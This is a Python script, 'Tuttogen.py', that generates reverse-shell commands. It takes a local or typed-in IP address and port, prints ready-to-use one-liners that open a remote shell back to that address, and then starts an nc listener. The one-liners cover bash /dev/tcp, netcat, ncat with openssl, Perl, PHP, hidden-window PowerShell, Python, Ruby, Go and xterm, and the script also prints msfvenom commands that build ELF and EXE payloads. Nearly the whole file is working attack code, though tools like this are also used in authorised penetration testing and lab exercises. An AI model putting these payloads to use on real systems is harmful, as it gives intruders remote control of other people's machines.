# @  pr0fsr
# pr0fsr007@gmail.com
# Tuttogen.py
import sys
import os
import time
iplist=list()
while(True):
	try:
		os.system("clear")
		print("""
  __          __    __          
_/  |_ __ ___/  |__/  |_    ____  
\   __\|  |  \   __\   __\/  _  \ ___ ____ _  _ 
 |  |  |  |   |  |  |  |  | | | |/ __| ___| \( )
 |  |  |  |   |  |  |  |  | | | ( (_-.)__) )  ( 
 |  |  |  |   |  |  |  |  | | | |\___(____|_)\_)
 |  |  |  |  /|  |  |  |  ( |_| )
 |__|  |____/ |__|  |__|   \____/     @ pr0fsr
                                
                                                            """)
		ip = os.popen('ip addr show tun0 2>&1 /dev/null').read().split("inet ")[1].split("/")[0]
		print("[1] tun0: ",end=" ")
		iplist.append(ip)
	except IndexError:
		print("[1] tun0: Not found")
		iplist.append("NOT FOUND")
	else:
		print(ip)
	try:
		ip = os.popen('ip addr show wlan0').read().split("inet ")[1].split("/")[0]
		print("[2] wlan0:",end=" ")
		iplist.append(ip)
	except IndexError:
		print("[2] wlan0: Not found")
		iplist.append("NOT FOUND")
	else:
		print(ip)
	try:
		ip = os.popen('ip addr show eth0 2>&1 /dev/null').read().split("inet ")[1].split("/")[0]
		print("[3] eth0: ",end=" ")
		iplist.append(ip)
	except IndexError:
		print("[3] eth0:  Not found")
		iplist.append("NOT FOUND")
	else:
		print(ip)
	choice=int(input("[4] Use own\n\nUse: "))
	if choice==1:
		ip=iplist[0]
		break;
	elif choice==2:
		ip=iplist[1]
		break;
	elif choice==3:
		ip=iplist[2]
		break;
	elif choice==4:
		ip=input("Ip: ")
		break;
	else:
		print("Invalid input found <--(o_O)") 
		time.sleep(1.5)
		continue;
port=input("Port: ")
time.sleep(1.5)
os.system("clear")
print("\n================[ TUTTOGEN ]===============\n")
print("[+] IP ADDRESS:  "+ip)
print("[+} PORT NUMBER: "+port)
print("\n===========================================\n")
bash = "bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1"
bash2 = "0<&196;exec 196<>/dev/tcp/"+ip+"/"+port+"; sh <&196 >&196 2>&196"
go = """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial(\"tcp",\""""+ip+""":"""+port+"""\");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""
nc = """nc -e /bin/sh """+ip+""" """+port
nc2 = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc """+ip+""" """+port+""" >/tmp/f"""
ncatssl = """ncat --ssl -vv -l -p """+port+"""\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect \""""+ip+""":"""+port+"""\" > /tmp/s; rm /tmp/s"""
lin_sl = """msfvenom -p linux/x86/shell_reverse_tcp LHOST="""+ip+""" LPORT="""+port+""" -f elf >reverse.elf"""
perl= """perl -e 'use Socket;$i=\"""" + ip + """";$p="""+port+""";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""
php = """php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");exec("/bin/sh <i <&3 >&3 2>&3");'"""
php2 = """php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"""
powershell1 = """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\""""+ip+"""","""+port+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
powershell2 = """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'"""+ip+"""\',"""+port+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
python = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+ip+"""","""+port+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno,2);p=subprocess.call(["/bin/sh","-i"]);'"""
python2 = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+ip+"""","""+port+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
ruby = """ruby -rsocket -e'f=TCPSocket.open(\""""+ip+"""","""+port+""").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f,f,f)'"""
win_sl = """msfvenom -p windows/shell_reverse_tcp LHOST="""+ip+""" LPORT="""+port+""" -f exe > reverse.exe"""
xterm = """xterm -display """+ip+""":"""+port
print("[+]Bash: "+bash)
print("\n[+]Bash 2: "+bash2)
print("\n[+]Go: "+go)
print("\n[+]nc: "+nc)
print("\n[+]nc 2: "+nc2)
print("\n[+]Ncat ssl: "+ncatssl)
print("\n[+]Lin_sl: "+lin_sl)
print("\n[+]Perl: "+perl)
print("\n[+]Php: "+php)
print("\n[+]Php 2: "+php2)
print("\n[+]Powershell: "+powershell1)
print("\n[+]Powershell: "+powershell2)
print("\n[+]Python: "+python)
print("\n[+]Python 2: "+python2)
print("\n[+]Ruby: "+ruby)
print("\n[+]Win_sl: "+win_sl)
print("\n[+]Xterm: "+xterm)
print("\n===================================================\n")
timer=9
while(timer>=0):
	sys.stdout.write("\r" +"Starting nc on "+port+" in "+str(timer)+" Sec\t\t(Press Ctrl+Z to abort)")
	sys.stdout.flush()
	timer-=1
	time.sleep(1)
print("\n")
os.system("nc -lvnp "+port)
